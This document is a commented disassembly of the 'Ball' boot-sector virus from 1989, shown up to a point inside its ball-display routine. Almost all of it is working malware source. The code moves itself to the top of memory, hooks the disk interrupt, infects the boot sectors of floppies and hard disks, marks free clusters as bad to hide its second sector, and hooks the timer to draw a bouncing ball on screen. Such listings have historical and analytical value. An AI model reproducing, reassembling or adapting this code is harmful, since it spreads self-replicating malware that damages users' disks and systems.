TITLE   *** ASMGEN - Version 2.51 ***
SUBTTL  BALL.VIR  3-15-89   [3-22-89]

RET_NEAR    MACRO
DB  0C3H
ENDM
;
.RADIX  16
;
;INITIAL VALUES :   CS:IP   0000:0100
;           SS:SP   0000:FFFF
                        ;L0000S   L7C00 DI  L7C1C CI  L7C93 CJ  L7D31 DB  L7D76 DB  L7DF7 CB  L7DF8 CB
                        ;     L7DFB CB  L7E86 DI  L7EA9 DI  L7EB2 CB  L7EBF DI  L7F4E DB  L7F62 DB
                        ;     L7FCB CI  L7FCD CI  L7FD3 CB
S0000   SEGMENT
    ASSUME  DS:S0000,SS:S0000,CS:S0000,ES:S0000
    ORG $+7C00H
L0000   EQU $-7C00
                        ;L0001    L7C0E CI  L7CDA DB  L7D12 DB  L7D33 DI  L7D46 DB  L7DE0 DI  L7DF3 CI
                        ;     L7E3A DI  L7E60 DI  L7EFC DB  L7F37 DB  L7F43 DI  L7FAD DB  L7FB6 DI
L0001   EQU $-7BFF
                        ;L0002    L7C0D CB  L7C10 CB  L7C16 CI  L7C1A CI  L7C2A DI  L7CE1 DB  L7D5A DB
                        ;     L7D93 DB  L7E08 DB  L7E75 DI  L7EB3 DB  L7EBA DB  L7F2C DB  L7FA0 DB
                        ;     L7FBF DB
L0002   EQU $-7BFE
                        ;L0003    L7E12 DI  L7F1C DB  L7F27 DB  L7F82 DB
L0003   EQU $-7BFDh
                        ;L0004    L7D43 DI  L7D46 DB  L7D4C DB  L7D4C DB  L7DDB DB  L7E15 DB  L7E31 DB
                        ;     L7E38 DB  L7E54 DB  L7E5E DB  L7F05 DB
L0004   EQU $-7BFC
                        ;L0005    L7F8B DB
L0005   EQU $-7BFBh
                        ;L0006    L7C30 DB  L7CB5 DB
L0006   EQU $-7BFA
                        ;L0007    L7EFE DB  L7F80 DB
L0007   EQU $-7BF9
                        ;L0008    L7FA4 DB
L0008   EQU $-7BF8
                        ;L0009    L7C18 CI  L7F46 DB
L0009   EQU $-7BF7
                        ;L000F    L7E42 DB  L7E5B DB  L7EE6 DB
L000F   EQU $-7BF1
                        ;L0010    L7D52 DI
L0010   EQU $-7BF0
                        ;L0013    L7DFB CB
L0013   EQU $-7BEDh
                        ;L0018    L7F58 DB
L0018   EQU $-7BE8
                        ;L001C    L7D69 DI
L001C   EQU $-7BE4
                        ;L0020    L7C59 DI  L7DA8 DI  L7E9A DI  L7EC4 DR  L7ECB DW  L7FC9 CI
L0020   EQU $-7BE0
                        ;L0022    L7EC7 DR  L7ED1 DW
L0022   EQU $-7BDE
                        ;L0024    L7D0D DI
L0024   EQU $-7BDC
                        ;L0040    L7EA4 DI
L0040   EQU $-7BC0
                        ;L004C    L7C75 DR  L7C7C DW
L004C   EQU $-7BB4
                        ;L004E    L7C78 DR  L7C82 DW
L004E   EQU $-7BB2
                        ;L0050    L7FD6 CB
L0050   EQU $-7BB0
                        ;L0055    L7DFE CB
L0055   EQU $-7BABh
                        ;L0057    L7DFB CB
L0057   EQU $-7BA9
                        ;L0070    L7C11 CI
L0070   EQU $-7B90
                        ;L0073    L7DF5 CI
L0073   EQU $-7B8Dh
                        ;L007F    L7CF4 DB
L007F   EQU $-7B81
                        ;L0080    L7C4E DB  L7D39 DB
L0080   EQU $-7B80
                        ;L0083    L7FB4 DB
L0083   EQU $-7B7Dh
                        ;L00AA    L7DFE CB
L00AA   EQU $-7B56
                        ;L00D3    L7DF9 CI
L00D3   EQU $-7B2Dh
                        ;L00EA    L7D29 DB  L7FC8 DB
L00EA   EQU $-7B16
                        ;L00F0    L7CF9 DB
L00F0   EQU $-7B10
                        ;L00FB    L7DD1 DB
L00FB   EQU $-7B05
                        ;L00FD    L7C15 CB
L00FD   EQU $-7B03
                        ;L00FE    L7D1E DB  L7DEC DB
L00FE   EQU $-7B02
                        ;L00FF    L7F53 DB  L7F5D DB  L7F67 DB  L7F72 DB  L7F86 DB  L7F8F DB
L00FF   EQU $-7B01
                        ;L0100    L7C3E DI
L0100   EQU $-7B00
                        ;L0101    L7F10 DI  L7F16 DI  L7FCD CI
L0101   EQU $-7AFF
                        ;L01FF    L7DAF DI  L7E27 DI
L01FF   EQU $-7A01
                        ;L0200    L7C0B CI  L7D8B DI  L7DB2 DI
L0200   EQU $-7A00
                        ;L0201    L7C9D DI  L7D2E DI  L7D5D DI
L0201   EQU $-79FF
                        ;L02D0    L7C13 CI
L02D0   EQU $-7930
                        ;L0301    L7C98 DI
L0301   EQU $-78FF
                        ;L0413    L7C27 DR  L7C2D DW
L0413   EQU $-77EDh
                        ;L07C0    L7C34 DI
L07C0   EQU $-7440
                        ;L0907    L7FB9 DI
L0907   EQU $-72F9
                        ;L0FF0    L7DD6 DI
L0FF0   EQU $-6C10
                        ;L1357    L7D6E DI
L1357   EQU $-68A9
                        ;L49E8    L7EB0 CI
L49E8   EQU $-3218
                        ;L77C0    L7D2C CI
L77C0   EQU $-440
                        ;L7C00    L7C22 DI  L7C39 DI  L7C93 CJ
;   Boot entry of Virus
BOOT:   JMP SHORT   INIT        ;Init virus ;7C00 EB 1C
                        ;L7C02    L7D66 DI
L7C02:  NOP                 ;7C02 90
;   OEM
    DB  'DOS  3.1'          ;7C03 44 4F 53 20 20 33 2E 31
;   Size of Disk sector in bytes
SEC_SIZE    EQU $
    DW  L0200               ;7C0B 00 02
                        ;L7C0D    L7DC4 DR  L7E78 DR
;   Size of Cluster in sectors
CLSTSIZE    EQU $
    DB  2               ;7C0D 02
                        ;L7C0E    L7DE3 DR
RES_SECT    EQU $
    DW  L0001               ;7C0E 01 00
FAT_NUMBER  EQU $
    DB  2               ;7C10 02
;   Size of root directory in Dir entryes
ROOT_SIZE   EQU $
    DW  L0070               ;7C11 70 00
                        ;L7C13    L7DBD DR
TOTAL_SECTORS   EQU $
    DW  L02D0               ;7C13 D0 02
MEDIA_TYPE  EQU $
    DB  0FDh                ;7C15 FD
;   Size of FAT in sectors
FAT_SIZE    EQU $
    DW  L0002               ;7C16 02 00
                        ;L7C18    L7CA7 DR
SEC_TRACK   EQU $
    DW  L0009               ;7C18 09 00
                        ;L7C1A    L7CB1 DR
HEADS   DW  L0002               ;7C1A 02 00
                        ;L7C1C    L7CA1 DR
HIDDEN_SCS  EQU $
    DW  L0000               ;7C1C 00 00
                        ;L7C1E    L7C00 CJ
;   Init virus
INIT:   XOR AX,AX               ;7C1E 33 C0
    MOV SS,AX               ;7C20 8E D0
    MOV SP,OFFSET BOOT      ;Boot entry of Virus    ;7C22 BC 00 7C
    MOV DS,AX               ;7C25 8E D8
    MOV AX,DS:MEM_SIZE      ;Memory size in kilobytes   
                        ;7C27 A1 13 04
    SUB AX,2                ;7C2A 2D 02 00
    MOV DS:MEM_SIZE,AX      ;Memory size in kilobytes   
                        ;7C2D A3 13 04
    MOV CL,6                ;7C30 B1 06
    SHL AX,CL               ;7C32 D3 E0
    SUB AX,7C0              ;7C34 2D C0 07
    MOV ES,AX               ;7C37 8E C0
    MOV SI,OFFSET BOOT      ;Boot entry of Virus    ;7C39 BE 00 7C
    MOV DI,SI               ;7C3C 8B FE
    MOV CX,100              ;7C3E B9 00 01
;   Moving virus to end of memory
    REPZ    MOVSW               ;7C41 F3 A5
;   And Jump There
    MOV CS,AX               ;7C43 8E C8
;   CS and DS to new virus location
    PUSH    CS              ;7C45 0E
    POP DS              ;7C46 1F
    CALL    SELF            ;Push ip in stack   ;7C47 E8 00 00
                        ;L7C4A    L7C47 CC
;   Push ip in stack
SELF:   XOR AH,AH               ;7C4A 32 E4
    INT 13              ;7C4C CD 13
    AND BYTE PTR CUR_DRIVE,80   ;Last Drive Accessed    ;7C4E 80 26 F8 7D 80
    MOV BX,VIRUSLSN     ;LSN of Virus extention ;7C53 8B 1E F9 7D
    PUSH    CS              ;7C57 0E
    POP AX              ;7C58 58
    SUB AX,20   ;' '            ;7C59 2D 20 00
;   Reading second part of virus
    MOV ES,AX               ;7C5C 8E C0
    CALL    READ_SC         ;Reads sector BX = LSN  ;7C5E E8 3C 00
    MOV BX,VIRUSLSN     ;LSN of Virus extention ;7C61 8B 1E F9 7D
    INC BX              ;7C65 43
    MOV AX,OFFSET LFFC0         ;7C66 B8 C0 FF
;   Readind original boot sector
    MOV ES,AX               ;7C69 8E C0
    CALL    READ_SC         ;Reads sector BX = LSN  ;7C6B E8 2F 00
    XOR AX,AX               ;7C6E 33 C0
    MOV FLAGS,AL        ;Sum semapfor type flags    
                        ;7C70 A2 F7 7D
    MOV DS,AX               ;7C73 8E D8
    MOV AX,DS:INT13_OFF         ;7C75 A1 4C 00
    MOV BX,DS:INT13_SEG         ;7C78 8B 1E 4E 00
    MOV WORD PTR DS:INT13_OFF,OFFSET NEW_INT13  
                        ;7C7C C7 06 4C 00 D0 7C
    MOV DS:INT13_SEG,CS         ;7C82 8C 0E 4E 00
    PUSH    CS              ;7C86 0E
    POP DS              ;7C87 1F
    MOV OLD_INT13_OFF,AX        ;7C88 A3 2A 7D
    MOV OLD_INT13_SEG,BX        ;7C8B 89 1E 2C 7D
    MOV DL,CUR_DRIVE        ;Last Drive Accessed    ;7C8F 8A 16 F8 7D
    JMP FAR PTR BOOTDS:     ;Boot entry of Virus    ;7C93 EA 00 7C 00 00
                        ;L7C98    L7E70 CC  L7E8F CC  L7E9F CC  L7EAC CC
;   Writes sector BX = LSN
WRITESC:
    MOV AX,301              ;7C98 B8 01 03
    JMP SHORT   OPERATE         ;7C9B EB 03
                        ;L7C9D    L7C5E CC  L7C6B CC  L7E0D CC  L7E89 CC
;   Reads sector BX = LSN
READ_SC:
    MOV AX,201              ;7C9D B8 01 02
                        ;L7CA0    L7C9B CJ
OPERATE:
    XCHG    BX,AX               ;7CA0 93
    ADD AX,HIDDEN_SCS           ;7CA1 03 06 1C 7C
    XOR DX,DX               ;7CA5 33 D2
    DIV WORD PTR SEC_TRACK      ;7CA7 F7 36 18 7C
    INC DL              ;7CAB FE C2
    MOV CH,DL               ;7CAD 8A EA
    XOR DX,DX               ;7CAF 33 D2
    DIV WORD PTR HEADS          ;7CB1 F7 36 1A 7C
    MOV CL,6                ;7CB5 B1 06
    SHL AH,CL               ;7CB7 D2 E4
    OR  AH,CH               ;7CB9 0A E5
    MOV CX,AX               ;7CBB 8B C8
    XCHG    CH,CL               ;7CBD 86 E9
    MOV DH,DL               ;7CBF 8A F2
    MOV AX,BX               ;7CC1 8B C3
                        ;L7CC3    L7D36 CC  L7D60 CC
;   Access disk service and returns one level more if Error
DISK_CALL:
    MOV DL,CUR_DRIVE        ;Last Drive Accessed    ;7CC3 8A 16 F8 7D
    MOV BX,OFFSET R_W_BUFF  ;Buffer for read/write sector   
                        ;7CC7 BB 00 80
    INT 13              ;7CCA CD 13
    JNB EXIT_D_CALL         ;7CCC 73 01
    POP AX              ;7CCE 58
                        ;L7CCF    L7CCC CJ
EXIT_D_CALL:
    RET_NEAR                ;7CCF C3
                        ;L7CD0    L7C7C DI  L7D2A CI
NEW_INT13:
    PUSH    DS              ;7CD0 1E
    PUSH    ES              ;7CD1 06
    PUSH    AX              ;7CD2 50
    PUSH    BX              ;7CD3 53
    PUSH    CX              ;7CD4 51
    PUSH    DX              ;7CD5 52
    PUSH    CS              ;7CD6 0E
    POP DS              ;7CD7 1F
    PUSH    CS              ;7CD8 0E
    POP ES              ;7CD9 07
    TEST    BYTE PTR FLAGS,1    ;Sum semapfor type flags    
                        ;7CDA F6 06 F7 7D 01
    JNZ EXIT_INT13          ;7CDF 75 42
    CMP AH,2                ;7CE1 80 FC 02
    JNZ EXIT_INT13          ;7CE4 75 3D
    CMP CUR_DRIVE,DL        ;Last Drive Accessed    ;7CE6 38 16 F8 7D
    MOV CUR_DRIVE,DL        ;Last Drive Accessed    ;7CEA 88 16 F8 7D
    JNZ L7D12           ;Don't Run if less then 24 Ticks    
                        ;7CEE 75 22
    XOR AH,AH               ;7CF0 32 E4
    INT 1A              ;7CF2 CD 1A
;   CX:DX <- BIOS Time
    TEST    DH,7F               ;7CF4 F6 C6 7F
    JNZ DONTBALL        ;Do not display ball    ;7CF7 75 0A
    TEST    DL,0F0              ;7CF9 F6 C2 F0
    JNZ DONTBALL        ;Do not display ball    ;7CFC 75 05
    PUSH    DX              ;7CFE 52
    CALL    BALL_ACT        ;Activate Ball on Screen    
                        ;7CFF E8 B1 01
    POP DX              ;7D02 5A
                        ;L7D03    L7CF7 CJ  L7CFC CJ
;   Do not display ball
DONTBALL:
    MOV CX,DX               ;7D03 8B CA
    SUB DX,TIME         ;Last time drive is accessed    
                        ;7D05 2B 16 B0 7E
    MOV TIME,CX         ;Last time drive is accessed    
                        ;7D09 89 0E B0 7E
    SUB DX,24   ;'$'            ;7D0D 83 EA 24
    JB  EXIT_INT13          ;7D10 72 11
                        ;L7D12    L7CEE CJ
;   Don't Run if less then 24 Ticks
L7D12:  OR  BYTE PTR FLAGS,1    ;Sum semapfor type flags    
                        ;7D12 80 0E F7 7D 01
    PUSH    SI              ;7D17 56
    PUSH    DI              ;7D18 57
    CALL    ATTACH          ;Attachs Last accessed device   
                        ;7D19 E8 12 00
    POP DI              ;7D1C 5F
    POP SI              ;7D1D 5E
    AND BYTE PTR FLAGS,0FE  ;Sum semapfor type flags    
                        ;7D1E 80 26 F7 7D FE
                        ;L7D23    L7CDF CJ  L7CE4 CJ  L7D10 CJ
EXIT_INT13:
    POP DX              ;7D23 5A
    POP CX              ;7D24 59
    POP BX              ;7D25 5B
    POP AX              ;7D26 58
    POP ES              ;7D27 07
    POP DS              ;7D28 1F
;   Opcode of far jmp
    DB  0EA             ;7D29 EA
                        ;L7D2A    L7C88 DW
OLD_INT13_OFF   EQU $
    DW  NEW_INT13           ;7D2A D0 7C
                        ;L7D2C    L7C8B DW
OLD_INT13_SEG   EQU $
    DW  L77C0               ;7D2C C0 77
                        ;L7D2E    L7D19 CC
;   Attachs Last accessed device
ATTACH: MOV AX,201              ;7D2E B8 01 02
    MOV DH,0                ;7D31 B6 00
    MOV CX,1                ;7D33 B9 01 00
    CALL    DISK_CALL       ;Access disk service and returns one level more if Error    
                        ;7D36 E8 8A FF
    TEST    BYTE PTR CUR_DRIVE,80   ;Last Drive Accessed    ;7D39 F6 06 F8 7D 80
    JZ  BOOT_READ       ;Boot sector now in memory  
                        ;7D3E 74 23
    MOV SI,OFFSET PART_TABLE    ;Partition Table    ;7D40 BE BE 81
    MOV CX,4                ;7D43 B9 04 00
                        ;L7D46    L7D55 CJ
;   Search in Partition table
PART_SEARCH:
    CMP BYTE PTR [SI+4],1       ;7D46 80 7C 04 01
    JZ  FOUND_IN_PART       ;Boot sector found in partition table   
                        ;7D4A 74 0C
    CMP BYTE PTR [SI+4],4       ;7D4C 80 7C 04 04
    JZ  FOUND_IN_PART       ;Boot sector found in partition table   
                        ;7D50 74 06
    ADD SI,10               ;7D52 83 C6 10
    LOOP    PART_SEARCH     ;Search in Partition table  
                        ;7D55 E2 EF
    RET_NEAR                ;7D57 C3
                        ;L7D58    L7D4A CJ  L7D50 CJ
;   Boot sector found in partition table
FOUND_IN_PART:
    MOV DX,[SI]             ;7D58 8B 14
    MOV CX,[SI+2]           ;7D5A 8B 4C 02
    MOV AX,201              ;7D5D B8 01 02
    CALL    DISK_CALL       ;Access disk service and returns one level more if Error    
                        ;7D60 E8 60 FF
                        ;L7D63    L7D3E CJ
;   Boot sector now in memory
BOOT_READ:
    MOV SI,OFFSET L8002         ;7D63 BE 02 80
    MOV DI,OFFSET L7C02         ;7D66 BF 02 7C
    MOV CX,1C               ;7D69 B9 1C 00
    REPZ    MOVSB               ;7D6C F3 A4
    CMP WORD PTR L81FC,1357 ;'W'    ;7D6E 81 3E FC 81 57 13
    JNZ NOT_ATTCD       ;Disk is not yet Attached   
                        ;7D74 75 15
    CMP BYTE PTR L81FB,0        ;7D76 80 3E FB 81 00
    JNB EXIT_RDY        ;Exit allready attached ;7D7B 73 0D
    MOV AX,D_LSN_D      ;LSN of first data sector of disk   
                        ;7D7D A1 F5 81
    MOV D_LSN,AX        ;LSN of first data sector   
                        ;7D80 A3 F5 7D
    MOV SI,LSN_DSK      ;LSN of virus of Disk   ;7D83 8B 36 F9 81
    JMP WRITE_CODE      ;Writes it self in two sectors of disk  
                        ;7D87 E9 08 01
                        ;L7D8A    L7D7B CJ  L7D91 CJ  L7D98 CJ
;   Exit allready attached
EXIT_RDY:
    RET_NEAR                ;7D8A C3
                        ;L7D8B    L7D74 CJ
;   Disk is not yet Attached
NOT_ATTCD:
    CMP WORD PTR SEC_SIZE_D,200 ;Size of Disk sector in bytes of Disk   
                        ;7D8B 81 3E 0B 80 00 02
    JNZ EXIT_RDY        ;Exit allready attached ;7D91 75 F7
    CMP BYTE PTR CLSTSIZE_D,2   ;Size of Cluster in sectors of Disk 
                        ;7D93 80 3E 0D 80 02
    JB  EXIT_RDY        ;Exit allready attached ;7D98 72 F0
    MOV CX,RES_SECT_D       ;of Disk    ;7D9A 8B 0E 0E 80
    MOV AL,FAT_NUMBER_D     ;of Disk    ;7D9E A0 10 80
    CBW                 ;7DA1 98
    MUL WORD PTR FAT_SIZE_D ;Size of FAT in sectors of Disk 
                        ;7DA2 F7 26 16 80
    ADD CX,AX               ;7DA6 03 C8
    MOV AX,20   ;' '            ;7DA8 B8 20 00
    MUL WORD PTR ROOT_SIZE_D    ;Size of root directory in Dir entryes of Disk  
                        ;7DAB F7 26 11 80
    ADD AX,1FF              ;7DAF 05 FF 01
    MOV BX,200              ;7DB2 BB 00 02
    DIV BX              ;7DB5 F7 F3
    ADD CX,AX               ;7DB7 03 C8
    MOV D_LSN,CX        ;LSN of first data sector   
                        ;7DB9 89 0E F5 7D
    MOV AX,TOTAL_SECTORS        ;7DBD A1 13 7C
    SUB AX,D_LSN        ;LSN of first data sector   
                        ;7DC0 2B 06 F5 7D
    MOV BL,CLSTSIZE     ;Size of Cluster in sectors 
                        ;7DC4 8A 1E 0D 7C
    XOR DX,DX               ;7DC8 33 D2
    XOR BH,BH               ;7DCA 32 FF
    DIV BX              ;7DCC F7 F3
    INC AX              ;7DCE 40
    MOV DI,AX               ;7DCF 8B F8
    AND BYTE PTR FLAGS,0FBh ;Sum semapfor type flags    
                        ;7DD1 80 26 F7 7D FB
    CMP AX,0FF0             ;7DD6 3D F0 0F
    JBE FAT_12_0        ;12 bit FAT ;7DD9 76 05
    OR  BYTE PTR FLAGS,4    ;Sum semapfor type flags    
                        ;7DDB 80 0E F7 7D 04
                        ;L7DE0    L7DD9 CJ
;   12 bit FAT
FAT_12_0:
    MOV SI,1                ;7DE0 BE 01 00
    MOV BX,RES_SECT         ;7DE3 8B 1E 0E 7C
    DEC BX              ;7DE7 4B
    MOV LSN_TEMP,BX     ;Sector to operate temp variable    
                        ;7DE8 89 1E F3 7D
    MOV BYTE PTR FAT_ADJUST,0FE ;Adjust pointer in FAT  ;7DEC C6 06 B2 7E FE
    JMP SHORT   NEXT_F_S    ;Next Sector of FAT. It is in Second Virus Sector.  
                        ;7DF1 EB 0D
                        ;L7DF3    L7DE8 DW  L7E00 DM  L7E04 DR  L7E6C DR
;   Sector to operate temp variable
LSN_TEMP    EQU $
    DW  L0001               ;7DF3 01 00
                        ;L7DF5    L7D80 DW  L7DB9 DW  L7DC0 DR  L7E80 DR
;   LSN of first data sector
D_LSN   DW  L0073               ;7DF5 73 00
                        ;L7DF7    L7C70 DW  L7CDA DT  L7D12 DM  L7D1E DM  L7DD1 DM  L7DDB DM  L7E15 DT
                        ;     L7E31 DT  L7E54 DT  L7EB3 DT  L7EBA DM
;   Sum semapfor type flags
FLAGS   DB  0               ;7DF7 00
                        ;L7DF8    L7C4E DM  L7C8F DR  L7CC3 DR  L7CE6 DT  L7CEA DW  L7D39 DT
;   Last Drive Accessed
CUR_DRIVE   EQU $
    DB  0               ;7DF8 00
                        ;L7DF9    L7C53 DR  L7C61 DR  L7E94 DW
;   LSN of Virus extention
VIRUSLSN    EQU $
    DW  L00D3               ;7DF9 D3 00
;   Marker 'Disk Attached'
    DB  0,57,13             ;7DFB 00 57 13
;   Boot sector marker
    DB  55,0AA              ;7DFE 55 AA
                        ;L7E00    L7DF1 CJ  L7E2B CJ
;   Next Sector of FAT. It is in Second Virus Sector.
NEXT_F_S:
    INC WORD PTR LSN_TEMP   ;Sector to operate temp variable    
                        ;7E00 FF 06 F3 7D
    MOV BX,LSN_TEMP     ;Sector to operate temp variable    
                        ;7E04 8B 1E F3 7D
    ADD BYTE PTR FAT_ADJUST,2   ;Adjust pointer in FAT  ;7E08 80 06 B2 7E 02
    CALL    READ_SC         ;Reads sector BX = LSN  ;7E0D E8 8D FE
    JMP SHORT   NEXT_ENTRY  ;Next entry in FAT  ;7E10 EB 39
                        ;L7E12    L7E4E CJ
;   Process single FAT entry
NEXT_ENTRY_LOOP:
    MOV AX,3                ;7E12 B8 03 00
    TEST    BYTE PTR FLAGS,4    ;Sum semapfor type flags    
                        ;7E15 F6 06 F7 7D 04
    JZ  FAT_12_1        ;AX = Bytes per two clusters in FAT 
                        ;7E1A 74 01
    INC AX              ;7E1C 40
                        ;L7E1D    L7E1A CJ
;   AX = Bytes per two clusters in FAT
FAT_12_1:
    MUL SI              ;7E1D F7 E6
    SHR AX,1                ;7E1F D1 E8
    SUB AH,FAT_ADJUST       ;Adjust pointer in FAT  ;7E21 2A 26 B2 7E
    MOV BX,AX               ;7E25 8B D8
    CMP BX,1FF              ;7E27 81 FB FF 01
    JNB NEXT_F_S        ;Next Sector of FAT. It is in Second Virus Sector.  
                        ;7E2B 73 D3
    MOV DX,[BX+R_W_BUFF]    ;Buffer for read/write sector   
                        ;7E2D 8B 97 00 80
    TEST    BYTE PTR FLAGS,4    ;Sum semapfor type flags    
                        ;7E31 F6 06 F7 7D 04
    JNZ FAT_16_1            ;7E36 75 0D
    MOV CL,4                ;7E38 B1 04
    TEST    SI,1                ;7E3A F7 C6 01 00
    JZ  RIGHT_ENTRY     ;Dont move FAT entry    ;7E3E 74 02
    SHR DX,CL               ;7E40 D3 EA
                        ;L7E42    L7E3E CJ
;   Dont move FAT entry
RIGHT_ENTRY:
    AND DH,0F               ;7E42 80 E6 0F
                        ;L7E45    L7E36 CJ
FAT_16_1:
    TEST    DX,0FFFF            ;7E45 F7 C2 FF FF
    JZ  FOUND_CL        ;Free cluster found ;7E49 74 06
                        ;L7E4B    L7E10 CJ
;   Next entry in FAT
NEXT_ENTRY:
    INC SI              ;7E4B 46
    CMP SI,DI               ;7E4C 3B F7
    JBE NEXT_ENTRY_LOOP     ;Process single FAT entry   
                        ;7E4E 76 C2
    RET_NEAR                ;7E50 C3
                        ;L7E51    L7E49 CJ
;   Free cluster found
FOUND_CL:
    MOV DX,OFFSET LFFF7         ;7E51 BA F7 FF
    TEST    BYTE PTR FLAGS,4    ;Sum semapfor type flags    
                        ;7E54 F6 06 F7 7D 04
    JNZ WRITE_BAD       ;Write marker for bad sector    
                        ;7E59 75 0D
    AND DH,0F               ;7E5B 80 E6 0F
    MOV CL,4                ;7E5E B1 04
    TEST    SI,1                ;7E60 F7 C6 01 00
    JZ  WRITE_BAD       ;Write marker for bad sector    
                        ;7E64 74 02
    SHL DX,CL               ;7E66 D3 E2
                        ;L7E68    L7E59 CJ  L7E64 CJ
;   Write marker for bad sector
WRITE_BAD:
    OR  [BX+R_W_BUFF],DX    ;Buffer for read/write sector   
                        ;7E68 09 97 00 80
    MOV BX,LSN_TEMP     ;Sector to operate temp variable    
                        ;7E6C 8B 1E F3 7D
    CALL    WRITESC         ;Writes sector BX = LSN ;7E70 E8 25 FE
    MOV AX,SI               ;7E73 8B C6
    SUB AX,2                ;7E75 2D 02 00
    MOV BL,CLSTSIZE     ;Size of Cluster in sectors 
                        ;7E78 8A 1E 0D 7C
    XOR BH,BH               ;7E7C 32 FF
    MUL BX              ;7E7E F7 E3
    ADD AX,D_LSN        ;LSN of first data sector   
                        ;7E80 03 06 F5 7D
    MOV SI,AX               ;7E84 8B F0
    MOV BX,0                ;7E86 BB 00 00
    CALL    READ_SC         ;Reads sector BX = LSN  ;7E89 E8 11 FE
    MOV BX,SI               ;7E8C 8B DE
    INC BX              ;7E8E 43
    CALL    WRITESC         ;Writes sector BX = LSN ;7E8F E8 06 FE
                        ;L7E92    L7D87 CJ
;   Writes it self in two sectors of disk
WRITE_CODE:
    MOV BX,SI               ;7E92 8B DE
    MOV VIRUSLSN,SI     ;LSN of Virus extention ;7E94 89 36 F9 7D
    PUSH    CS              ;7E98 0E
    POP AX              ;7E99 58
    SUB AX,20   ;' '            ;7E9A 2D 20 00
    MOV ES,AX               ;7E9D 8E C0
    CALL    WRITESC         ;Writes sector BX = LSN ;7E9F E8 F6 FD
;   OverWrite Boot sector
    PUSH    CS              ;7EA2 0E
    POP AX              ;7EA3 58
    SUB AX,40   ;'@'            ;7EA4 2D 40 00
    MOV ES,AX               ;7EA7 8E C0
    MOV BX,0                ;7EA9 BB 00 00
    CALL    WRITESC         ;Writes sector BX = LSN ;7EAC E8 E9 FD
    RET_NEAR                ;7EAF C3
                        ;L7EB0    L7D05 DR  L7D09 DW
;   Last time drive is accessed
TIME    DW  L49E8               ;7EB0 E8 49
                        ;L7EB2    L7DEC DW  L7E08 DM  L7E21 DR
;   Adjust pointer in FAT
FAT_ADJUST  EQU $
    DB  0               ;7EB2 00
                        ;L7EB3    L7CFF CC
;   Activate Ball on Screen
BALL_ACT:
    TEST    BYTE PTR FLAGS,2    ;Sum semapfor type flags    
                        ;7EB3 F6 06 F7 7D 02
    JNZ EXIT_BALL_ACT           ;7EB8 75 24
    OR  BYTE PTR FLAGS,2    ;Sum semapfor type flags    
                        ;7EBA 80 0E F7 7D 02
    MOV AX,0                ;7EBF B8 00 00
    MOV DS,AX               ;7EC2 8E D8
    MOV AX,DS:TIMER_OFF         ;7EC4 A1 20 00
    MOV BX,DS:TIMER_SEG         ;7EC7 8B 1E 22 00
    MOV WORD PTR DS:TIMER_OFF,OFFSET TIMER  ;Timer Interrupt Handler    
                        ;7ECB C7 06 20 00 DF 7E
    MOV DS:TIMER_SEG,CS         ;7ED1 8C 0E 22 00
    PUSH    CS              ;7ED5 0E
    POP DS              ;7ED6 1F
    MOV OLD_TIMER_OFF,AX        ;7ED7 A3 C9 7F
    MOV OLD_TIMER_SEG,BX        ;7EDA 89 1E CB 7F
                        ;L7EDE    L7EB8 CJ
EXIT_BALL_ACT:
    RET_NEAR                ;7EDE C3
                        ;L7EDF    L7ECB DI
;   Timer Interrupt Handler
TIMER:  PUSH    DS              ;7EDF 1E
    PUSH    AX              ;7EE0 50
    PUSH    BX              ;7EE1 53
    PUSH    CX              ;7EE2 51
    PUSH    DX              ;7EE3 52
    PUSH    CS              ;7EE4 0E
    POP DS              ;7EE5 1F
    MOV AH,0F               ;7EE6 B4 0F
    INT 10              ;7EE8 CD 10
    MOV BL,AL               ;7EEA 8A D8
    CMP BX,L7FD4        ;Sum vars   ;7EEC 3B 1E D4 7F
    JZ  L7F27               ;7EF0 74 35
    MOV L7FD4,BX        ;Sum vars   ;7EF2 89 1E D4 7F
    DEC AH              ;7EF6 FE CC
    MOV L7FD6,AH        ;Sum vars   ;7EF8 88 26 D6 7F
    MOV AH,1                ;7EFC B4 01
    CMP BL,7                ;7EFE 80 FB 07
    JNZ L7F05               ;7F01 75 02
    DEC AH              ;7F03 FE CC
                        ;L7F05    L7F01 CJ
L7F05:  CMP BL,4                ;7F05 80 FB 04
    JNB L7F0C               ;7F08 73 02
    DEC AH              ;7F0A FE CC
                        ;L7F0C    L7F08 CJ
L7F0C:  MOV L7FD3,AH        ;Sum vars   ;7F0C 88 26 D3 7F
    MOV WORD PTR L7FCF,101      ;7F10 C7 06 CF 7F 01 01
    MOV WORD PTR L7FD1,101      ;7F16 C7 06 D1 7F 01 01
    MOV AH,3                ;7F1C B4 03
    INT 10              ;7F1E CD 10
    PUSH    DX              ;7F20 52
    MOV DX,L7FCF            ;7F21 8B 16 CF 7F
    JMP SHORT   L7F4A           ;7F25 EB 23
                        ;L7F27    L7EF0 CJ
L7F27:  MOV AH,3                ;7F27 B4 03
    INT 10              ;7F29 CD 10
    PUSH    DX              ;7F2B 52
    MOV AH,2                ;7F2C B4 02
    MOV DX,L7FCF            ;7F2E 8B 16 CF 7F
    INT 10              ;7F32 CD 10
    MOV AX,L7FCD        ;Sum vars   ;7F34 A1 CD 7F
    CMP BYTE PTR L7FD3,1    ;Sum vars   ;7F37 80 3E D3 7F 01
    JNZ L7F41               ;7F3C 75 03
    MOV AX,OFFSET L8307         ;7F3E B8 07 83
                        ;L7F41    L7F3C CJ
L7F41:  MOV BL,AH               ;7F41 8A DC
    MOV CX,1                ;7F43 B9 01 00
    MOV AH,9                ;7F46 B4 09
    INT 10              ;7F48 CD 10
                        ;L7F4A    L7F25 CJ
L7F4A:  MOV CX,L7FD1            ;7F4A 8B 0E D1 7F
    CMP DH,0                ;7F4E 80 FE 00
    JNZ L7F58               ;7F51 75 05
    XOR CH,0FF              ;7F53 80 F5 FF
    INC CH              ;7F56 FE C5
                        ;L7F58    L7F51 CJ
L7F58:  CMP DH,18               ;7F58 80 FE 18
    JNZ L7F62               ;7F5B 75 05
    XOR CH,0FF              ;7F5D 80 F5 FF
    INC CH              ;7F60 FE C5
                        ;L7F62    L7F5B CJ
L7F62:  CMP DL,0                ;7F62 80 FA 00
    JNZ L7F6C               ;7F65 75 05
    XOR CL,0FF              ;7F67 80 F1 FF
    INC CL              ;7F6A FE C1
                        ;L7F6C    L7F65 CJ
L7F6C:  CMP DL,L7FD6        ;Sum vars   ;7F6C 3A 16 D6 7F
    JNZ L7F77               ;7F70 75 05
    XOR CL,0FF              ;7F72 80 F1 FF
    INC CL              ;7F75 FE C1
                        ;L7F77    L7F70 CJ
